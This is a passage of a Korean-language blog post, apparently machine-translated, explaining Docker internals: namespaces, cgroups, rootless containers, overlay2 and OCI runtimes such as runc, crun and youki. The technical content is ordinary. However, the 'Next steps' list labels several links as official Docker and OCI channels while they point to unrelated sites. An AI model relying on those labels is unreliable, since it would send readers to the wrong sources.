컨테이너에 맞게 변경됩니다. 컨테이너를 OS에서 실행할 때, 실제로는 아무 것도 설치하지 않습니다. 컨테이너는 OS 위에 위치하고 자체의 세계에서 실행됩니다.\n\n<div class=\"content-ad\"></div>\n\n멋진 참고 자료: 컨테이너는 리눅스 프로세스가 아닙니다!\n\n**네임스페이스**\n\n리눅스 커널은 많은 응용 프로그램들이 시스템 상에서 실행될 수 있도록 공통 기능을 제공하는 개념을 갖고 있습니다. 이 개념은 네임스페이스라고 불립니다. 이것은 컨테이너 기술의 기반이 됩니다.\n\n리눅스 네임스페이스는 파일 시스템, 사용자 관리, 마운트된 장치, 프로세스, 네트워크를 포함한 다양한 추상화를 위해 존재합니다.\n\n<div class=\"content-ad\"></div>\n\nNamespace는 6 + 1단계에서 컨테이너가 격리를 가지도록 합니다. 각 네임스페이스의 목적은 특정 전역 시스템 자원을 추상화하여 네임스페이스 내 프로세스들이 전역 자원의 격리된 인스턴스를 갖는 것처럼 보이게 하는 것입니다.\n\n![이미지](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_11.png)\n\n사용자(USER): [CLONE_NEWUSER]: 사용자와 그룹 ID를 격리합니다. 프로세스의 사용자 ID와 그룹 ID는 사용자 네임스페이스 내외에서 다를 수 있습니다.\n\nPID: (프로세스 ID): [CLONE_NEWPID]: 프로세스 ID를 격리하여 각 컨테이너가 자체 init을 갖도록 합니다. 프로세스는 네임스페이스 내부와 호스트 시스템 외부에서 두 개의 PID를 갖습니다. Docker 컨테이너 내에서 Init 시스템을 확인하세요. - @BeNitinAgarwal\n\n<div class=\"content-ad\"></div>\n\nUTS(UNIX 시간 공유 시스템): [CLONE_NEWUTS]: 호스트 이름 (uname() 시스템 콜)과 네트워크 정보 서비스 (NIS) 도메인 이름을 격리합니다.\n\nNET(네트워크): [CLONE_NEWNET]: 네트워크 인터페이스 컨트롤러를 격리합니다. (예: 장치, IP 주소, IP 라우팅 테이블, /proc/net 디렉토리, 포트 번호 등)\n\nMNT(마운트): [CLONE_NEWNS]: 파일 시스템 마운트 지점을 격리합니다. (mount() 및 umount() 시스템 콜)\n\nIPC(프로세스 간 통신): [CLONE_NEWIPC]: 시스템 V IPC 객체 및 POSIX 메시지 큐를 격리합니다.\n\n<div class=\"content-ad\"></div>\n\n시간 네임스페이스에 대해 논의가 있었습니다.\n\n네임스페이스 격리는 프로세스 그룹이 분리되어 다른 그룹의 리소스를 \"보지\" 못하게 하는 것을 의미합니다: [11]\n\n- 다른 UTS 네임스페이스의 프로세스는 각각의 전용 호스트 이름을 볼 수 있고 독립적으로 호스트 이름을 편집할 수 있습니다.\n- 다른 사용자 네임스페이스의 프로세스는 사용자 목록을 각자 가지고 있고 다른 프로세스에 영향을 주지 않고 사용자를 추가하거나 제거할 수 있습니다.\n- 각 PID 네임스페이스의 프로세스는 해당 네임스페이스에 속한 각 PID에 대해 다른 PID를 받으며, 각 PID 네임스페이스는 자체 PID 트리를 가지고 있습니다.\n- 프로세스는 항상 각 유형의 하나의 네임스페이스에 정확히 속해 있습니다.\n\n프로세스를 네임스페이스에 넣음으로써 해당 프로세스에 표시되는 리소스를 제한할 수 있습니다. 네임스페이스의 기원은 Plan 9로 거슬러 올라갑니다.\n\n<div class=\"content-ad\"></div>\n\n네임스페이스 개념은 리소스 관리와 우선 순위 설정을 적용하기 위해 cgroups의 도움으로 확장되었습니다: Linux 컨테이너는 제한된 리소스(예: 메모리, CPU, I/O, 네트워크 등)를 사용하도록 제어 그룹(cgroups)을 활용합니다. 이를 통해 컨테이너가 호스트 리소스를 모두 소비하는 것을 방지할 수 있습니다. 따라서 적절히 조정된 cgroups가 보안 관점에서 중요합니다.\n\n제어 그룹 (cgroups)\n\nCgroups를 사용하면 격리의 특정 정도를 적용하고 프로세스가 수행할 수 있는 작업을 제한할 수 있습니다: 기능, 리소스 한도 등. 이것은 컨테이너의 런타임 정의의 기본 개념입니다. 컨테이너를 시작할 때 런타임은 새 cgroups를 생성합니다.\n\nCgroup은 CPU 및 메모리 사용량을 제한하는 것뿐만 아니라 /dev/sda1과 같은 장치 파일에 대한 액세스를 제한합니다.\n\n<div class=\"content-ad\"></div>\n\n프로세스 그룹 내에서 허용된 총 프로세스 수를 제한하려면 pid라는 제어 그룹이 있습니다. 이는 포크 폭탄의 효과를 방지할 수 있습니다.\n\n리눅스 커널은 cgroups에 관한 정보를 /sys/fs/cgroup에 주로 위치하는 의사 파일 시스템 세트를 통해 송수화합니다. 컨테이너 내부에서는 /proc에서 사용 가능한 자체 cgroup 목록이 있습니다. 각 cgroup은 cgroup.procs라는 인터페이스 파일을 갖고 있는데, 이 파일은 cgroup에 속한 모든 프로세스의 PID를 한 줄씩 나열합니다. [12]\n\n루트리스 컨테이너\n기본적으로 컨테이너는 루트로 실행됩니다. 그러나 컨테이너 내의 프로세스를 제어할 수 있는 공격자도 어떤 식으로든 컨테이너를 탈출해야 하며, 결국 호스트 머신에서 루트 권한을 가질 수밖에 없습니다.\n\nLinux 커널의 사용자 네임스페이스(UserNS)를 사용하여 가짜 권한을 에뮬레이션하는 루트리스 컨테이너가 생성됩니다.\n\n<div class=\"content-ad\"></div>\n\nRootless containers는 권한이 없는 사용자가 컨테이너를 생성, 실행 및 관리할 수 있는 능력을 의미합니다. 권한이 없는 사용자는 관리자 권한이 없고 추가 권한을 요청할 수도 없습니다. 권한이 없는 사용자는 컨테이너가 실행될 사용자 및 그룹 범위를 관리합니다.\n\n도커 19.03에서는 루트리스 모드 (루트리스 runc, containerd 및 BuildKit)의 거의 모든 기능을 제공하며 포트 포워딩 및 다중 컨테이너 네트워킹을 지원합니다. 리소스 제한 기능은 도커 20.10에서 Control Group v2를 사용하여 구현되었습니다. 즉, Control Group v1에서는 루트리스 컨테이너를 관리할 수 없습니다. cgroup v2 컨트롤러를 비루트 사용자에게 활성화하고 위임하는 것은 최신 버전 (≥ 244)의 systemd를 권장합니다. 이전 systemd는 cpuset 컨트롤러의 위임을 지원하지 않습니다. 버전 5.2보다 낮은 커널은 freezer 부족으로 권장되지 않습니다.\n\n사용자 공간에서 특권 작업을 제한하는 몇 가지 라이브러리가 있습니다.\n\n- rootless-containers/slirp4netns: 루트리스 네트워크 네임스페이스에 대한 사용자 모드 네트워킹(\"slirp\")을 제공하여 네트워크 생성/상호 작용을 제한합니다.\n- containers/fuse-overlayfs: rootless 컨테이너용 FUSE에서 overlay+shiftfs의 구현: 루트 파일 시스템 및 사용자 ID, 그룹 ID 처리를 상호 작용합니다.\n\n<div class=\"content-ad\"></div>\n\n도커와 다른 컨테이너 엔진은 가능한 컨테이너 탈출 공격으로부터 호스트의 실제 루트를 보호하기 위해 RootlessKit을 사용합니다.\n\n## 네임스페이스\n\n네임스페이스는 리눅스 컨테이너의 기본적인 측면입니다!\n\n리눅스 네임스페이스는 2002년 2.4.19 커널에서 원본이 되었습니다! 2006년부터 시작되어 미래에 이르기까지 추가 네임스페이스가 계속해서 추가되었습니다.\n\n<div class=\"content-ad\"></div>\n\n적절한 컨테이너 지원 기능은 사용자 네임스페이스의 도입을 통해 커널 버전 3.8에서 완료되었습니다.\n\n## 커널\n\n커널은 \"항상 메모리에 상주하는 운영 체제 코드 부분\"으로, 하드웨어와 소프트웨어 구성 요소 간의 상호 작용을 용이하게 합니다. 전체 커널은 장치 드라이버를 통해 모든 하드웨어 리소스(예: I/O, 메모리, 암호화)를 제어하며, 이러한 리소스에 관한 프로세스 간 충돌을 조정하고 CPU 및 캐시 사용, 파일 시스템 및 네트워크 소켓의 공통 리소스 활용을 최적화합니다.\n\n커널의 인터페이스는 저수준 추상화 계층입니다. 프로세스가 커널에 서비스를 요청할 때는 일반적으로 래퍼 함수를 통해 시스템 호출을 호출해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n도커 커널 모듈\n\n커널 모듈은 Linux 커널에 동적으로 로드되어 기능을 확장하거나 특정 기능을 제공하는 코드 조각입니다. 도커의 경우 컨테이너화 및 저장 기능을 구현하기 위해 커널 기능과 모듈을 활용합니다.\n\noverlay2 스토리지 드라이버는 여러 레이어의 컨테이너 이미지를 서로 쌓을 수 있는 복사본-쓰기(CoW) 메커니즘입니다. 이 드라이버는 Linux 커널이 제공하는 overlay 파일 시스템을 활용하여 여러 디렉토리를 단일 마운트 포인트 위에 쌓아서 파일 시스템의 통합적이고 레이어드된 뷰를 만듭니다.\n\n모듈 overlay 경로를 확인하려면: $ modprobe overlay. 모듈 폴더는 /lib/modules/5.11.0–38-generic와 같은 위치에 저장됩니다.\n\n<div class=\"content-ad\"></div>\n\n## 오픈 컨테이너 이니셔티브\n\n오픈 컨테이너 이니셔티브(OCI)는 컨테이너 형식과 런타임에 대한 오픈 산업 표준을 만들기 위한 목적으로 구성된 경량의 오픈 거버넌스 구조(프로젝트)로, 리눅스 재단의 보호 아래 형성되었습니다. OCI는 2015년 6월 22일 Docker, CoreOS 및 기타 컨테이너 산업의 선도 업체들에 의해 시작되었습니다.\n\nOCI는 현재 두 가지 명세를 포함하고 있습니다: 런타임 명세(runtime-spec) 및 이미지 명세(image-spec). 런타임 명세는 디스크에 풀어 헤처진 \"파일 시스템 번들\"을 실행하는 방법에 대해 기술합니다. 상위 수준에서, OCI 구현은 OCI 이미지를 다운로드한 다음 그 이미지를 OCI 런타임 파일 시스템 번들로 풀어 헤칩니다. 이 시점에서 OCI 런타임 번들은 OCI 런타임에 의해 실행됩니다.\n\nOCI Slack 채널에 가입하여 최신 정보를 받아보세요!\n\n<div class=\"content-ad\"></div>\n\n## OCI Runtime Spec\n\n오픈 컨테이너 이니셔티브는 운영 체제 프로세스 및 응용 프로그램 컨테이너에 대한 표준 사양을 개발합니다. 오픈 컨테이너 이니셔티브 런타임 사양(opencontainers/runtime-spec)은 컨테이너의 구성, 실행 환경 및 수명 주기를 명시하는 것을 목표로 합니다.\n\n컨테이너의 구성은 지원되는 플랫폼의 config.json으로 지정되며, 컨테이너를 생성할 수 있게 하는 필드를 설명합니다. 구성에 대한 JSON 스키마를 유효성 검사하려면 validate.go 파일을 사용하세요. 여기에는 일부 스키마 레이아웃이 있습니다:\n\n- config-schema.json — 구성 스키마의 주요 진입점\n- state-schema.json — 상태 JSON 스키마의 주요 진입점\n- defs.json — 일반 유형에 대한 정의\n\n<div class=\"content-ad\"></div>\n\n실행 환경은 컨테이너 내에서 실행되는 응용 프로그램이 런타임 중에 일관된 환경을 갖도록 지정되었으며, 컨테이너의 라이프사이클을 정의하는 공통 작업이 포함되어 있습니다. \n\n런타임은 다음 작업을 반드시 지원해야 합니다:\n\n- 상태 `container-id`\n- 생성 `container-id` `path-to-bundle`\n- 시작 `container-id`\n- 종료 `container-id` `signal`\n- 삭제 `container-id`\n\nrunc\n\n<div class=\"content-ad\"></div>\n\nrunc은 OCI 사양에 따라 Linux 컨테이너를 생성하고 실행하는 CLI 도구입니다. runc는 컨테이너 이미지에 포함된 파일을 사용하여 컨테이너를 시작하고, Linux 커널에게 적절한 네임스페이스, cgroups 컨텍스트 등에서 프로세스를 시작하도록 지시합니다.\n\n도커는 OCI에 그 새로운 노력의 중심이 되기 위해 컨테이너 형식 및 런타임인 runc을 기부하고 있습니다.\n\nGo 자체의 런타임은 멀티 스레드입니다. setns(2)는 멀티 스레드 프로세스에 사용할 수 없습니다. 따라서 runC는 언어 런타임이 시작되기 전에 C 프로세스를 실행합니다. 그러나 이 작업은 Go의 main 함수에 도달하기 전에 수행되어야 합니다. 따라서 create 하위 명령어는 init 하위 명령어를 호출하고, init 하위 명령어는 init() 함수에서 C 프로세스를 호출합니다. nsenter 패키지는 Go 런타임이 부팅될 기회가 생기기 전에 호출되는 특별한 init 생성자를 등록합니다.\n\nrunc은 컨테이너 프로세스가 시작되기 전에 환경 설정을 위해 C로 작성된 libcontainer 모듈을 사용하여 자체를 다시 실행합니다.\n\n<div class=\"content-ad\"></div>\n\n## crun\n\ncrun은 컨테이너를 실행하는 빠르고 가볍고 완전한 기능을 제공하는 OCI 런타임 및 C 라이브러리입니다. Red Hat이 주도하는 C로 완전히 작성된 OCI Runtime Spec의 또 다른 구현체입니다. 수 년간 함께해 왔으며, cri-o의 기본 런타임입니다.\n\ncrun은 OCI 컨테이너를 관리하는 외부 프로세스를 필요로 하지 않고도 프로그램에 쉽게 포함될 수 있는 라이브러리로도 사용할 수 있도록 목표로 합니다.\n\ncrun은 /bin/true를 100번 실행하는 데 runc보다 49.4% 빠르며, 훨씬 낮은 메모리 풋프린트를 갖추고 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\nrailcar (archieved)\n\nrailcar은 OCI 런타임 사양의 Rust 구현입니다. 참조 구현인 runc과 유사하지만, Rust로 완전히 구현되어 있어 메모리 안전성을 위해 가비지 컬렉터나 여러 스레드가 필요하지 않습니다.\n\n@vishvananda의 \"Rust로 컨테이너 런타임 빌드하는 방법\" 기사를 놓치지 않는 것이 좋습니다.\n\nyouki\n\n\n<div class=\"content-ad\"></div>\n\nyouki는 Rust에서 OCI 런타임 사양을 구현한 프로젝트입니다! 프로젝트의 동기는 정말 멋집니다: 메모리 안정성, 더 빠르고 덜 메모리를 사용할 수 있는 가능성! 이 프로젝트는 railcar에서 영감을 받았습니다. 프로젝트의 설계 및 구현 세부 정보를 확인하는 것을 잊지 마세요.\n\n## OCI 런타임 도구\n\nruntime-tools는 OCI 런타임 사양과 함께 작업하는 도구 모음입니다:\n\n-  $ oci-runtime-tool generate: OCI 번들을 위한 구성 JSON을 생성합니다. runc와 같은 OCI 호환 런타임은 구성을 config.json에서 읽을 것으로 예상합니다.\n-  $ oci-runtime-tool validate: OCI 번들을 검증합니다. OCI 번들이 유효성 검사 과정에 실패하면 오류 메시지가 인쇄됩니다.\n-  $ sudo RUNTIME=runc validation/default/default.t: 런타임 검증 스위트를 실행합니다. 예를 들어, youki의 integration_test.sh로 이동하여 테스트 케이스를 실행하는 방법을 확인할 수 있습니다. crun은 테스트를 실행하기 위해 oci-runtime-validation을 사용합니다. runc는 대부분 통합 테스트 케이스를 실행하기 위해 bats-core를 사용합니다.\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\n도커의 내부 작업을 탐구하면 복잡하고 복잡한 기술 생태계와 협력이 드러나게 됩니다. 도커 데스크톱부터 리눅스 cgroups까지 고수준과 저수준 아키텍처에 대한 심층적인 탐구를 통해 컨테이너 세계가 처음에 보이던 것보다 간단하지 않음이 분명해졌습니다.\n\n도커를 이해하는 여정은 다음과 같은 많은 가치 있는 통찰과 배움으로 가득했습니다:\n\n- 컨테이너를 강력하고 다양하게 만드는 다양한 구성 요소를 원활하게 통합하기 위해 필요한 노력과 전문 지식에 대한 깊은 이해를 얻었습니다.\n- 이 기술에 대한 이해력이 향상되었을 뿐만 아니라 끝에서 끝까지 프로세스를 원활하게 만드는 데 끊임없이 노력하는 무수히 많은 개인들의 협력을 강조했습니다.\n- 복잡성을 수용하고 지속적인 학습에 투자하는 것은 우리가 컨테이너의 힘을 이용하고 번성하는 컨테이너화 생태계에 기여하는 데 도움이 될 것입니다.\n\n<div class=\"content-ad\"></div>\n\n바투한 아페이딘과 야신 타하 에롤에게 기여해줘서 감사합니다!\n\n# 다음 단계\n\n최신 업계 뉴스, 프로젝트 및 새로운 릴리스에 대해 계속해서 최신 정보를 유지하는 중요성을 강조하는 것이 중요합니다. 컨테이너화 분야는 지속적으로 발전하고 있으며 개선과 혁신이 지속적으로 이루어지고 있습니다. 업계 트렌드를 적극적으로 따라가면 우리의 지식이 현재의 것이며 관련성을 유지할 수 있습니다.\n\n뉴스를 따르고 Slack 및 메일 그룹에 참여하여 항상 최신 상태를 유지하세요:\n\n<div class=\"content-ad\"></div>\n\n- Docker: [Blog](https://www.aquasec.com/cloud-native-academy/docker-container/docker-containers-vs-virtual-machines/) — [GitHub](https://www.tiejiang.org/23394.html) — [Twitter](https://www.pngegg.com/en/png-pbils) — [Slack](https://stackoverflow.com/a/47023753/5685796) — [HNRSS](https://ops.tips/blog/dockerfile-golang/) — [Reddit](https://blog.ramlot.eu/containers/)\n- OCI: [GitHub](https://github.com/opencontainers/runtime-spec/blob/main/spec.md) — [Twitter](https://iximiuz.com/en/posts/oci-containers/) — [Slack](https://www.oreilly.com/library/view/kubernetes-in-action/9781617293726/) — [Mail Group](https://www.oreilly.com/library/view/container-security/9781492056690/)\n- Containerd: [GitHub](https://github.com/containerd/containerd) — [Twitter](https://twitter.com/containerd) — [CNCF Slack](https://kubernetes.io/blog/2018/05/24/kubernetes-containerd-integration-goes-ga/#crictl)\n\n쿠버네티스와 같은 컨테이너 오케스트레이션 플랫폼을 배우면서 여러분의 스킬셋을 확장해보세요. 제가 강력히 권장하는 부분이죠. 이를 통해 실무 능력을 더욱 향상하고 복잡한 환경 내에서 컨테이너를 효율적으로 관리하고 오케스트레이션하는 방법에 대한 더 깊은 이해를 얻을 수 있을 거에요.\n\n# 참고 자료\n\n[0]: https://www.aquasec.com/cloud-native-academy/docker-container/docker-containers-vs-virtual-machines/\n[1]: https://www.tiejiang.org/23394.html\n[2]: https://www.pngegg.com/en/png-pbils\n[3]: https://opencontainers.org/about/overview/\n[4]: https://stackoverflow.com/a/47023753/5685796\n[5]: https://ops.tips/blog/dockerfile-golang/\n[6]: https://iximiuz.com/en/posts/oci-containers/\n[7]: https://en.wikipedia.org/wiki/Linux_namespaces\n[8]: https://man7.org/linux/man-pages/man7/namespaces.7.html\n[9]: https://rootlesscontaine.rs/\n[10]: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux_atomic_host/7/html/managing_containers/signing_container_images\n[11]: https://blog.ramlot.eu/containers/\n[12]: https://facebookmicrosites.github.io/cgroup2/docs/create-cgroups.html\n[13]: https://github.com/opencontainers/runtime-spec/blob/main/spec.md\n[14]: https://www.reddit.com/r/rust/comments/pweqkb/comment/hejdot0\n[15]: https://www.aquasec.com/cloud-native-academy/container-security/container-runtime-interface/\n[16]: https://kubernetes.io/blog/2018/05/24/kubernetes-containerd-integration-goes-ga/#crictl\n[17]: https://www.oreilly.com/library/view/kubernetes-in-action/9781617293726/\n[18]: https://developpaper.com/practice-of-docker-file-system/\n[19]: https://www.alibabacloud.com/blog/cri-and-shimv2-a-new-idea-for-kubernetes-integrating-container-runtime_594783\n[20]: https://vitalflux.com/docker-images-containers-internals-for-beginners/\n[21]: https://www.oreilly.com/library/view/container-security/9781492056690/\n\n<div class=\"content-ad\"></div>\n\n이 게시물이 유익했고 도커의 내부 작업을 종합적으로 탐구하는 것을 즐겁게 경험하셨기를 바랍니다. 언제든지 트위터나 GitHub에서 연락주세요.\n\n![image](https://miro.medium.com/v2/resize:fit:292/0*KGm2_fqSSkfEfZbJ.gif)\n\n푸르칸 튀르칼","ogImage":{"url":"/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_0.png"},"coverImage":"/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_0.png","tag":["Tech"],"readingTime":34}],"page":"102","totalPageCount":113,"totalPageGroupCount":6,"lastPageGroup":13,"currentPageGroup":5},"__N_SSG":true}